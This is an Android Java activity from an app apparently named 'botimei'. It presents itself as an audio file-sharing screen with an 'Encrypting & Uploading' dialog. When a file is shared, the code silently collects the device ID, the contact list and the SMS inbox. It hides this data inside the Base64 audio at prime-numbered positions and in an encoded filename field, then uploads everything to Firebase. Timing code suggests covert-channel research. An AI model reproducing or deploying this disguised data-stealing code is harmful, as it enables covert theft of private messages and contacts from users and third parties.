package com.example.botimei;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.OpenableColumns;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.example.botimei.adapter.ShowFileSharedAdapter;
import com.example.botimei.model.FileShared;
import com.google.android.gms.tasks.Continuation;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

public class ShareFile extends AppCompatActivity {

    FloatingActionButton fab_addFile;
    RecyclerView rv_fileShared;
    TextView tv_appBarName;
    String username, id, email, image, sender, phone;

    ProgressDialog dialog;
    Uri imageuri = null;
    String filename = "";
    DatabaseReference reference;

    List<FileShared> fileSharedList = new ArrayList<>();
    ShowFileSharedAdapter adapter;

    String IMEINumber;
    ArrayList contact_name = new ArrayList();
    ArrayList contact_number = new ArrayList();
    public static String msgData;

    String filepath_audio;
    String base64StringAudio;

    public static long beginEncode,endEncode;

    private static final int REQUEST_CODE = 101;

    @RequiresApi(api = Build.VERSION_CODES.N)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_share_file);

        fab_addFile = findViewById(R.id.fab_addFile);
        tv_appBarName = findViewById(R.id.tv_appBarName);
        rv_fileShared = findViewById(R.id.rv_fileShared);
        rv_fileShared.setHasFixedSize(true);
        rv_fileShared.setLayoutManager(new LinearLayoutManager(ShareFile.this));

        Intent intent = getIntent();
        username = intent.getStringExtra("username");
        id = intent.getStringExtra("id");
        email = intent.getStringExtra("email");
        image = intent.getStringExtra("image");
        sender = intent.getStringExtra("sender");
        phone = intent.getStringExtra("phone");

        Toast.makeText(ShareFile.this, "sender: " + sender, Toast.LENGTH_SHORT).show();

        tv_appBarName.setText("File Shared with " + username);

        getFileShared();

        fab_addFile.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                shareFile();
            }
        });


//        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
//        if (ActivityCompat.checkSelfPermission(ShareFile.this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
//            ActivityCompat.requestPermissions(ShareFile.this, new String[]{Manifest.permission.READ_PHONE_STATE}, REQUEST_CODE);
//            return;
//        }
//        IMEINumber = telephonyManager.getDeviceId();
        IMEINumber = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
//        textView.setText(IMEINumber);

    }

    public static String convertStringToBinary(String input) {

        StringBuilder result = new StringBuilder();
        char[] chars = input.toCharArray();
        for (char aChar : chars) {
            result.append(
                    String.format("%8s", Integer.toBinaryString(aChar))   // char -> int, auto-cast
                            .replaceAll(" ", "0")                         // zero pads
            );
        }
        return result.toString();
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public static String prettyBinary(String binary, int blockSize, String separator) {

        List<String> result = new ArrayList<>();
        int index = 0;
        while (index < binary.length()) {
            result.add(binary.substring(index, Math.min(index + blockSize, binary.length())));
            index += blockSize;
        }

        return result.stream().collect(Collectors.joining(separator));
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String permissions[], @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case REQUEST_CODE: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "Permission granted.", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "Permission denied.", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }

    private void shareFile() {
        Intent galleryIntent = new Intent();
        galleryIntent.setAction(Intent.ACTION_GET_CONTENT);
        galleryIntent.setType("audio/*");
        startActivityForResult(galleryIntent, 1);

    }

    private static byte[] readBytesFromFile(String filePath) throws IOException {
        Path path = Paths.get(filePath);
        return Files.readAllBytes(path);
    }

    private static String encodeBytesToBase64(byte[] bytes) {
            return Base64.getEncoder().encodeToString(bytes);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == RESULT_OK) {

            beginEncode = System.currentTimeMillis();
            System.out.println("Start Time: "+beginEncode);

            dialog = new ProgressDialog(this);
            dialog.setMessage("Encrypting & Uploading");

            dialog.show();
            imageuri = data.getData();

            final String[] split = imageuri.getPath().split(":");//split the path.
            filepath_audio = split[1];//assign it to a string(your choice).

            filename = getFileName(imageuri);

            Uri uri = data.getData();
//            File file = null;

            Toast.makeText(ShareFile.this, "filename : " + filename, Toast.LENGTH_SHORT).show();

            final String timestamp = "" + System.currentTimeMillis();
            StorageReference storageReference = FirebaseStorage.getInstance().getReference();
            final String messagePushID = timestamp;

            String[] file_format;
            file_format = filename.split("\\.",2);
//            System.out.println("FILENAME: "+filename);
//            System.out.println("FORMAT: "+file_format[1]);
            final StorageReference filepath = storageReference.child(messagePushID + "." + file_format[1]);
            filepath.putFile(imageuri).continueWithTask((Continuation) task -> {
                if (!task.isSuccessful()) {
                    throw task.getException();
                }
                return filepath.getDownloadUrl();
            }).addOnCompleteListener((OnCompleteListener<Uri>) task -> {
                if (task.isSuccessful()) {
                    dialog.dismiss();

                    Uri uri1 = task.getResult();
                    String myurl;
                    myurl = uri1.toString();

//                    showKeyDialog(file);

                    // Read the audio file as bytes
                    byte[] audioBytes = new byte[0];
                    try {
                        audioBytes = readBytesFromFile("/"+filepath_audio); //Run from Emulator
//                        audioBytes = readBytesFromFile(Environment.getExternalStorageDirectory()+"/"+filepath_audio); //Run from Physical Device
//                        System.out.println("Audio Data in Bytes: "+audioBytes);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                    // Encode the audio bytes as Base64
                        base64StringAudio = encodeBytesToBase64(audioBytes);
//                        System.out.println("Base64 Encoded audio: " + base64StringAudio.length());


                    getAllContacts();
                    readSms();
                    String contact = "\n"+contact_name.get(0).toString() +":"+ contact_number.get(0).toString() +"\n"+contact_name.get(1).toString()+":"+contact_number.get(1).toString();

//                    System.out.println("IMEI:"+IMEINumber);
//                    System.out.println("IMEI in Bits:"+convertStringToBinary(IMEINumber).length());
//                    System.out.println("Contact:"+contact);
//                    System.out.println("Contact in Bits:"+convertStringToBinary(contact).length());
//                    System.out.println("SMS:"+msgData);
//                    System.out.println("SMS in Bits:"+convertStringToBinary(msgData).length());
//                    System.out.println("FileName:"+filename);
//                    System.out.println("FileName in Bits:"+convertStringToBinary(filename).length());

//                    String sensitive_data = prettyBinary(convertStringToBinary(IMEINumber+";"+contact+";"+msgData+";"), 8, "");
//                    System.out.println("Sensitive Data: "+sensitive_data);
//                    System.out.println("Sensitive Data Length: "+sensitive_data.length());

                    String sensitive_data = IMEINumber+";"+contact+";"+msgData+";";
//                    System.out.println("Sensitive Data: "+sensitive_data);
//                    System.out.println("Sensitive Data Length: "+sensitive_data.length());

                    String encodefile = insertCharacters(base64StringAudio, sensitive_data);
//                    System.out.println("Demo Encode: "+encodefile);


                    String binary_data= prettyBinary(convertStringToBinary(IMEINumber+";"+contact+";"+msgData+";"+filename), 8, " ");

                    String encodedString = Base64.getEncoder().encodeToString(binary_data.getBytes());
                    endEncode = System.currentTimeMillis();
//                    System.out.println("End Time: "+endEncode);
//                    System.out.println("Total Time Encode: "+((endEncode-beginEncode)/1000F));

//                    System.out.println("Total Bits: "+encodedString.length());
                    System.out.println("Total Bits: "+(prettyBinary(convertStringToBinary(IMEINumber+";"+contact+";"+msgData), 8, " ")).length());


                    reference = FirebaseDatabase.getInstance().getReference().child(UserRegister.FILE_SHARED).child(username).push();

                    HashMap<String, String> hashMap = new HashMap<>();
                    hashMap.put("id", id);
                    hashMap.put("username", username);
                    hashMap.put("sender", sender);
                    hashMap.put("filename", encodedString);
                    hashMap.put("fileUrl", myurl);
                    hashMap.put("phone", phone);
                    hashMap.put("file", encodefile);
                    hashMap.put("data", base64StringAudio);



                    String fileCode = reference.getKey();

                    reference.setValue(hashMap).addOnCompleteListener(new OnCompleteListener<Void>() {
                        @Override
                        public void onComplete(@NonNull Task<Void> task) {
                            if (task.isSuccessful()) {
                                filename = "";
//                               sendSMS(phone, fileCode);
                                getFileShared();
                                Toast.makeText(ShareFile.this, "Uploaded Successfully", Toast.LENGTH_SHORT).show();
                                System.out.println("End Time: "+endEncode);
                                System.out.println("Total Time Encode: "+((endEncode-beginEncode)/1000F));
                            }
                        }
                    });
                } else {
                    dialog.dismiss();
                    Toast.makeText(ShareFile.this, "UploadedFailed", Toast.LENGTH_SHORT).show();
                }
            });
        }
    }


//    private void showKeyDialog(File file) {
//        String keyAES = "AES" + username + filename;
//        String keyDES = "DES" + username + filename;
//
//        MyEncryptionClass.encryptionAES(file, keyAES);
//        MyEncryptionClass.encryptionDES(file, keyDES);
//    }

    private void decryptDialog(File file) {
        String keyAES = "AES" + username + filename;
        String keyDES = "DES" + username + filename;

        try {
            MyEncryptionClass.decryptionAES(file, keyAES);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        try {
            MyEncryptionClass.decryptionDES(file, keyDES);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static boolean isPrime(int n) {
        if (n <= 1) {
            return false;
        }
        if (n == 2) {
            return true;
        }
        for (int i = 2; i <= Math.sqrt(n); i++) {
            if (n % i == 0) {
                return false;
            }
        }
        return true;
    }

    public static List<Integer> generatePrimes(int count) {
        List<Integer> primes = new ArrayList<>();
        int num = 2;
        while (primes.size() < count) {
            if (isPrime(num)) {
                primes.add(num);
            }
            num++;
        }
        return primes;
    }

    public static String insertCharacters(String firstString, String secondString) {
        List<Integer> primeSeries = generatePrimes(secondString.length());
        StringBuilder result = new StringBuilder();
        int index = 0;
        int i = 0;

        for (int primeNumber : primeSeries) {
            // Move ahead in the first string based on the prime number
            index += primeNumber;
            // Insert the character from the second string into the result
            result.append(firstString, 0, index).append(secondString.charAt(i));
            // Update the first string to remove the inserted character
            firstString = firstString.substring(index);
            // Reset the index for the next iteration
            index = 0;
            i++;
        }

        // Add the remaining characters from the first string to the result
        result.append(firstString);

        return result.toString();
    }




    private void sendSMS(String number, String msg) {

        Intent intent = new Intent(getApplicationContext(), MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(getApplicationContext(), 0, intent, 0);

        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(number, null, msg, pi, null);

    }

    @SuppressLint("Range")
    public String getFileName(Uri uri) {
        String result = null;
        if (uri.getScheme().equals("content")) {
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            try {
                if (cursor != null && cursor.moveToFirst()) {
                    result = cursor.getString(cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME));
                }
            } finally {
                cursor.close();
            }
        }
        if (result == null) {
            result = uri.getPath();
            int cut = result.lastIndexOf('/');
            if (cut != -1) {
                result = result.substring(cut + 1);
            }
        }
        return result;
    }

    private void getFileShared() {
        FirebaseUser firebaseUser = FirebaseAuth.getInstance().getCurrentUser();
        if (firebaseUser.getUid() != null) {
            DatabaseReference reference = FirebaseDatabase.getInstance().getReference().child(UserRegister.FILE_SHARED).child(username);
            reference.addListenerForSingleValueEvent(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    fileSharedList.clear();
                    for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                        FileShared model = dataSnapshot.getValue(FileShared.class);
                        if (model.getSender().equals(sender)) {
                            fileSharedList.add(model);
                        }
                    }
                    adapter = new ShowFileSharedAdapter(ShareFile.this, fileSharedList);
                    rv_fileShared.setAdapter(adapter);
                }

                @Override
                public void onCancelled(@NonNull DatabaseError error) {

                }
            });
        }
    }


    private void getAllContacts() {
//        ArrayList<String> nameList = new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if ((cur!= null ? cur.getCount() : 0) > 0) {
            while (cur!= null && cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
//                nameList.add(name);

//                if(name.equals("Test Cowert") || name.equals("Test abhinav"))
//                {
                    contact_name.add(name);
//                }

                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
//                        numberArray.add(phoneNo);
//                        if(name.equals("Test Cowert") || name.equals("Test abhinav"))
//                        {
                            contact_number.add(phoneNo);
//                        }

                    }
                    pCur.close();
                }
            }
        }
        if (cur!= null) {
            cur.close();
        }
    }

    private void readSms()
    {
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(2) + ":" + cursor.getString(2) + " " + cursor.getColumnName(12) + ":" + cursor.getString(12);
                    break;
                }
                // use msgData
            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
        }
    }

    public static String convertStringToBits(String input) {
        StringBuilder stringBuilder = new StringBuilder();

        for (int i = 0; i < input.length(); i++) {
            char c = input.charAt(i);
            String binaryString = Integer.toBinaryString(c);

            // Append leading zeros if necessary
            int leadingZeros = 8 - binaryString.length();
            for (int j = 0; j < leadingZeros; j++) {
                stringBuilder.append('0');
            }

            // Append the binary representation of the character
            stringBuilder.append(binaryString);
        }

        return stringBuilder.toString();
    }

}